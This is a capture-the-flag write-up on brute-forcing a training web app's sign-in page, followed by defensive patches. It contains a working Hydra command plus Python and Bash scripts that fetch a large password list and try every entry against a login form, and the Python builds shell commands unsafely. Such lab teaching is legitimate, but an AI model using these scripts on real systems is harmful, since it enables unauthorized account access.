# 💪 Bruteforce

## 📖 Definition

A **brute-force attack** is a method used to gain unauthorized access to a system, network, or encrypted data by systematically trying all possible combinations of credentials or keys until the correct one is found. This type of attack relies on sheer computational power and persistence, making it one of the simplest, yet most resource-intensive and time-consuming, attack methods.

**Key Characteristics of a Brute-Force Attack:**

1. **Trial-and-Error Approach:** Attackers use software to automatically generate and test millions or billions of potential passwords, usernames, or encryption keys, often using algorithms that speed up this trial-and-error process.

2. **No Subtlety or Sophistication:** Unlike other types of cyber attacks that may rely on exploiting specific vulnerabilities, brute-force attacks don't require intricate knowledge of the target system. The approach is purely a numbers game: try everything until something works.

3. **Dependent on Computational Power:** The speed and feasibility of a brute-force attack are heavily influenced by the processing power available to the attacker. More powerful systems (or botnets of compromised machines working together) can test combinations faster.

4. **Types of Brute-Force Attacks:**

	- **Simple Brute-Force Attack:** Every possible combination of characters is tested, regardless of the target's characteristics.
	- **Dictionary Attack:** Attackers use a predefined list of likely passwords, often based on commonly used passwords or information known about the target.
	- **Hybrid Attack:** Combines a dictionary attack with variations on each entry, such as adding numbers or symbols to commonly used words.

## 🔍 Discovery

On the **Signin** page, we try several `username:password` combinations after realizing that the `username` and `password` are directly filled in the URL in this format: `username=<username>&password=<password>`.
So, at this point, we can code a little Python script to test all the possibilities with the `root` username. Why with this username? Because we tested it first but, in fact, whatever it is, you'll get the flag if the password is good. For the dictionary, we use [this one](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt) from GitHub.

## 🏁 Flag

**1. The manual way:**

1. Take the passwords list on [this site](https://datanews.levif.be/actualite/le-top-25-des-mots-de-passe-les-plus-courants-et-les-plus-faibles/)
2. Go on the **Signin** page
3. In the username field, type whatever you want
4. In the password field, test all the passwords in the list

**2. Using Hydra:**

1. Download and store the dictionary by running:

```bash
curl -o dictionary https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

2. Find the password by running:

```bash
hydra -l root -P dictionary -F -V "<ip>" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
```

## 💡 Solutions

We provide two solutions: a Python and a Bash script.

**script.py**

```Python
import requests, sys, subprocess

password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
username = "root"

def get_password_list(url):
	response = requests.get(url)
	return response.text.splitlines()

def run_curl_command(ip, password):
	curl_command = f'curl -s "http://{ip}/index.php?page=signin&username={username}&password={password}&Login=Login#"'
	grep_command = "grep flag | awk -F': | <' '{print \"\\nThe flag is: \"$2}'"
	
	full_command = f"{curl_command} | {grep_command}"
	
	try:
		result = subprocess.check_output(full_command, shell=True, stderr=subprocess.PIPE)
		return result.decode().strip()
	except subprocess.CalledProcessError:
		return None

def bruteforce(ip):
	try:
		response = requests.get(f"http://{ip}", timeout=3)
		response.raise_for_status()
	except requests.exceptions.RequestException as e:
		print("Connection failed. Bad IP or network issue!")
		return False

	password_list = get_password_list(password_list_url)
	for password in password_list:
		password = password.strip()
		
		flag = run_curl_command(ip, password)
		
		if flag:
			print(f"Success! Username: {username} Password: {password}")
			print(flag)
			return True
	
	print("Password not found in the list.")
	return False

def main():
	if len(sys.argv) != 2:
		print("Usage: python script.py <ip>")
		sys.exit(1)
	bruteforce(sys.argv[1])

if __name__ == "__main__":
	main()
```

It first checks if the provided IP address is reachable by sending a `GET` request. It then downloads a list of common passwords from a specified URL and iterates through each password, attempting to log in with the username `root`. For each password, it constructs a `curl` command to attempt a login on the target site, and pipes the result to `grep` to check if the word "flag" appears in the response, indicating a successful login. If the word "flag" is found, the script prints the valid username, password, and the extracted flag, then stops. If no valid password is found after testing all options, it prints a failure message.

**script.sh**

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: ./script.sh <ip>"
	exit 1
fi

ip=$1

function exec_hydra {
	curl -o dictionary https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
	output=$(hydra -l root -P dictionary -F -V "$ip" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif')
	password=$(echo "$output" | grep -oP 'password: \K\S+')
	rm dictionary
}

if command -v hydra &> /dev/null; then
	echo "Hydra is installed."
	exec_hydra
else
	echo "Hydra is not installed."
	echo "Installation..."
	git clone https://github.com/vanhauser-thc/thc-hydra.git
	cd thc-hydra
	./configure --prefix=$HOME/.local
	make
	make install
	export PATH=$HOME/.local/bin:$PATH
	source ~/.bashrc
	source ~/.zshrc
	exec_hydra
fi

curl "http://$ip/index.php?page=signin&username=root&password=$password&Login=Login#" | grep flag | awk -F': | <' '{print "\nThe flag is: "$2}'
```

It first checks if the provided IP address argument is supplied. If not, it prints a usage message and exits. The script then verifies if Hydra is installed by checking for the `hydra` command. If Hydra is found, it downloads a common password dictionary using `curl`, runs Hydra with the password list to brute-force the login page, and extracts the password found from the Hydra output using `grep`. The password is stored in a variable, and the dictionary file is deleted afterward. If Hydra is not installed, the script clones the Hydra repository from GitHub, compiles, installs it locally, and sets the necessary environment variables before running Hydra. Finally, the script sends a `curl` request with the found password to the login page and extracts the flag from the response using `grep` and `awk`, printing the flag if found.

## 🔧 Patch

Many defensive measures can be taken, but here are the main ones:

- **Password Complexity:** Requiring complex, long passwords makes brute-forcing more time-consuming.
- **Account Lockouts:** Locking an account after several failed attempts can thwart brute-force efforts.
- **Multi-Factor Authentication (MFA):** Adding an additional layer of security (e.g., a verification code sent to the user) can stop a brute-force attack even if a password is successfully guessed.
- **Rate Limiting and Captchas:** These limit the number of attempts an attacker can make in a given timeframe, slowing down or deterring brute-force attempts.

To better understand the importance to have a stong password, here is a chart to estimate the time it takes a hacker to brute force your password in 2024:

![](https://images.squarespace-cdn.com/content/5ffe234606e5ec7bfc57a7a3/1719499399309-7FRIR5QNH5P4VHC1AGGP/Hive+Systems+Password+Table+-+2024+Rectangular.png?format=1500w&content-type=image%2Fpng)
